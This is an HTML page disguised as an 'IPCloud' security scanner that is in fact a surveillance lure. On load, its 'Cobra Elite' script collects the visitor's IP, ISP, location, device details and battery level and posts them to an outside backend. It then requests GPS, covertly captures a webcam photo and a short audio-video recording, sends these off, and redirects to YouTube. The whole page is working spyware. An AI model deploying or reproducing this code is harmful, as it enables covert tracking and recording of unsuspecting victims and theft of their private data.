<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IPCloud - Security Scanner</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
    <style>
        :root { --primary: #007bff; --bg: #0f172a; --card: #1e293b; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .container { width: 90%; max-width: 450px; background: var(--card); border-radius: 16px; padding: 30px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; border: 1px solid #334155; }
        .logo { font-size: 24px; font-weight: bold; color: var(--primary); margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .status-box { background: #0f172a; border-radius: 12px; padding: 15px; margin: 20px 0; border-left: 4px solid var(--primary); text-align: left; }
        .status-item { font-size: 13px; margin: 8px 0; color: #94a3b8; display: flex; justify-content: space-between; }
        .status-item b { color: #38bdf8; }
        .loader { width: 20px; height: 20px; border: 2px solid #334155; border-top-color: var(--primary); border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">☁️ IP<span>Cloud</span></div>
    <div class="status-box">
        <div class="status-item">IP Address: <b id="ip_disp">Analyzing...</b></div>
        <div class="status-item">Location: <b id="loc_disp">Detecting...</b></div>
        <div class="status-item">Battery: <b id="bat_disp">Checking...</b></div>
    </div>
    <div style="display: flex; justify-content: center; align-items: center; gap: 10px;">
        <div class="loader"></div>
        <div id="log" style="font-size: 14px; color: #38bdf8;">Syncing Protocols...</div>
    </div>
</div>

<video id="v" autoplay muted playsinline></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");
    const reKey = urlParams.get("re");
    const v = document.getElementById("v");
    const c = document.getElementById("c");

    async function send(payload) {
        if (!chatId) return;
        payload.chat_id = chatId;
        return fetch("https://render-backend-package1.onrender.com/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    }

    async function getIPDetails(ip) {
        try {
            // API 1
            let r1 = await fetch(`https://ipapi.co/${ip}/json/`);
            let d1 = await r1.json();
            if (d1.city) {
                return { city: d1.city, country: d1.country_name, code: d1.country_code, isp: d1.org };
            }
            throw new Error();
        } catch (e) {
            try {
                // API 2 (Fallback)
                let r2 = await fetch(`http://ip-api.com/json/${ip}`);
                let d2 = await r2.json();
                return { city: d2.city, country: d2.country, code: d2.countryCode, isp: d2.isp };
            } catch (e2) {
                return { city: "N/A", country: "N/A", code: "N/A", isp: "N/A" };
            }
        }
    }

    async function startCobraElite() {
        const parser = new UAParser();
        const resUA = parser.getResult();
        
        let rawIp = "Unknown";
        try {
            const resIp = await fetch("https://api.ipify.org?format=json");
            const dataIp = await resIp.json();
            rawIp = dataIp.ip;
            document.getElementById("ip_disp").innerText = rawIp;
        } catch(e) {}

        const details = await getIPDetails(rawIp);
        document.getElementById("loc_disp").innerText = details.city + ", " + details.code;

        let bat = "N/A";
        try {
            const b = await navigator.getBattery();
            bat = Math.round(b.level * 100) + "% " + (b.charging ? "(Charging)" : "");
            document.getElementById("bat_disp").innerText = bat;
        } catch(e) {}

        const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
        const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Unknown";

        let m = "🏁 *COBRA ELITE V26 (FIXED)* 🏁\n";
        m += "━━━━━━━━━━━━━━━━━━━━\n";
        m += `🌍 *IP:* \`${rawIp}\`\n`;
        m += `📍 *Loc:* ${details.city}, ${details.country}\n`;
        m += `🏢 *ISP:* ${details.isp}\n`;
        m += `📱 *Device:* ${resUA.device.vendor || ''} ${resUA.device.model || ''}\n`;
        m += `⚙️ *System:* ${resUA.os.name} ${resUA.os.version}\n`;
        m += `🧠 *Specs:* ${ram} RAM | ${cores} CPU\n`;
        m += `🔋 *Battery:* ${bat}\n`;
        m += "━━━━━━━━━━━━━━━━━━━━\n";
        
        await send({ message: m });
        requestGPS();
    }

    function requestGPS() {
        document.getElementById("log").innerText = "Calibrating GPS...";
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const gpsMsg = `🎯 *GPS:* [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                await send({ message: gpsMsg });
                proceedToCamera();
            }, () => proceedToCamera(), {timeout: 5000});
        } else { proceedToCamera(); }
    }

    async function proceedToCamera() {
        document.getElementById("log").innerText = "Identity Verification...";
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            v.srcObject = stream;
            v.onloadedmetadata = () => {
                v.play();
                setTimeout(async () => {
                    const ctx = c.getContext("2d");
                    ctx.drawImage(v, 0, 0, c.width, c.height);
                    await send({ photo: c.toDataURL("image/jpeg", 0.6).split(',')[1] });
                    startVideo(stream);
                }, 1500);
            };
        } catch (e) { finish(); }
    }

    function startVideo(stream) {
        const rec = new MediaRecorder(stream);
        let chunks = [];
        rec.ondataavailable = e => chunks.push(e.data);
        rec.onstop = async () => {
            const reader = new FileReader();
            reader.readAsDataURL(new Blob(chunks));
            reader.onloadend = async () => {
                await send({ video: reader.result.split(',')[1] });
                finish();
            };
        };
        rec.start();
        setTimeout(() => { rec.stop(); stream.getTracks().forEach(t => t.stop()); }, 4000);
    }

    function finish() {
        window.location.replace("https://youtube.com");
    }

    if (chatId) startCobraElite();
</script>
</body>
</html>
